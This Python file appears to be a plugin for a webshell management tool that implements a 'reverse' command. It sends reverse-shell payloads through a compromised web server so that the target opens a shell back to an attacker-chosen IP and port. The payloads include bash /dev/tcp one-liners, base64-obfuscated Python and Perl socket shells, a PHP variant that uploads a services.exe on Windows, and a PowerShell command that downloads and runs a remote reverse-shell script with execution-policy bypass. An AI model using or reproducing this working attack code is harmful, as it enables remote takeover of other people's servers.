from threading import Thread
from time import sleep

from libs.config import alias, color, gget
from libs.myapp import base64_encode, delay_send, has_env, is_windows, send, get_system_code, randint, get_ini_value_code
from libs.functions.webshell_plugins.reverse import *


def get_reverse_php(ip: str, port: str, upload_path: str):
    if (is_windows()):
        filename = f"{upload_path}\\\\services.exe"
        return get_php_reverse_php()["windows"] % (
            filename, get_system_code(f"{filename} {ip} {port}", False))
    else:
        return get_php_reverse_php()["else"] % (ip, port, get_ini_value_code())


def oneline_python(code: str):
    return '''python -c "exec(\\"exec(__import__('base64').b64decode('%s'.encode()).decode())\\")"''' % base64_encode(code)


def get_reverse_python(ip, port):
    if is_windows():
        return oneline_python("""import os, socket, subprocess, threading, sys
os.chdir('%s')
def s2p(s, p):
    while True:p.stdin.write(s.recv(1024).decode()); p.stdin.flush()
def p2s(s, p):
    while True: s.send(p.stdout.read(1).encode())
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect(("%s", %s))
except:
    s.close(); sys.exit(0)
p=subprocess.Popen(["cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)
threading.Thread(target=s2p, args=[s,p], daemon=True).start()
threading.Thread(target=p2s, args=[s,p], daemon=True).start()
try:
    p.wait()
except:
    s.close(); sys.exit(0)""" % (
            gget("webshell.root", "webshell"), ip, port,))
    else:
        return (
            oneline_python(
                """python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn('/bin/sh');s.close();'""" %
                (ip, port))
        )


@alias(True, func_alias="re", _type="SHELL", p="port", type="reverse_type")
def run(ip: str, port: str, reverse_type: str = ""):
    """
    reverse

    Reverse shell to a host from target system. Default type is bash or powershell, depend on the target system.

    eg: reverse {ip} {port} {type=bash/powershell}

    reverse_type:
      - bash
      - bash_exec
      - php (windows will upload a exe, Try not to use this function!!)
      - python
      - powershell(ps)
      - perl (only for *unix)
    """
    reverse_type = str(reverse_type).lower()
    # set default reverse_type
    if not reverse_type:
        if is_windows():
            reverse_type = "powershell"
        else:
            reverse_type = "bash"

    if reverse_type == "bash":
        if (is_windows()):
            print(color.red("Target system is windows"))
            return
        command = f"""bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'"""
        t = Thread(target=send, args=(get_system_code(command),))
        t.setDaemon(True)
        t.start()
    elif reverse_type == "bash_exec":
        pipe_num = randint(100, 300)
        command = f"""bash -c '0<&{pipe_num}-;exec {pipe_num}<>/dev/tcp/{ip}/{int(port)};sh <&{pipe_num} >&{pipe_num} 2>&{pipe_num}'"""
        t = Thread(target=send, args=(get_system_code(command),))
        t.setDaemon(True)
        t.start()
    elif reverse_type == "php":
        upload_tmp_dir = gget("webshell.upload_tmp_dir", "webshell")
        php = get_reverse_php(ip, port, upload_tmp_dir)
        t = Thread(target=send, args=(php,))
        t.setDaemon(True)
        t.start()

        # remove .exe after 10 second
        if (is_windows()):
            t2 = Thread(target=delay_send, args=(
                10.0, f"unlink('{upload_tmp_dir}\\\\services.exe');",))
            t2.setDaemon(True)
            t2.start()
    elif reverse_type in ("powershell", "ps"):
        command = '''IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress %s -port %s''' % (ip, port)
        command = f"powershell -nop -ep bypass -encodedcommand {base64_encode(command, encoding='utf-16le')}"
        t = Thread(target=send, args=(get_system_code(command),))
        t.setDaemon(True)
        t.start()
    elif reverse_type == "perl":
        if (is_windows()):
            print(color.red("Target system is windows"))
            return
        command = """perl -e 'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'""" % (
            ip, port)
        t = Thread(target=send, args=(get_system_code(command),))
        t.setDaemon(True)
        t.start()
    elif reverse_type == "python":
        if has_env("python"):
            t = Thread(target=send, args=(get_system_code(
                get_reverse_python(ip, port), False),))
            t.setDaemon(True)
            t.start()
        else:
            print(
                color.red(
                    "The target host does not exist or cannot be found in the python environment"
                )
            )
            return
    else:
        print(color.red("Reverse type Error"))
        return
    sleep(1)
    if (t.is_alive()):
        print(f"\nReverse shell to {ip}:{port} {color.green('success')}\n")
    else:
        print(f"\nReverse shell {color.red('error')}\n")
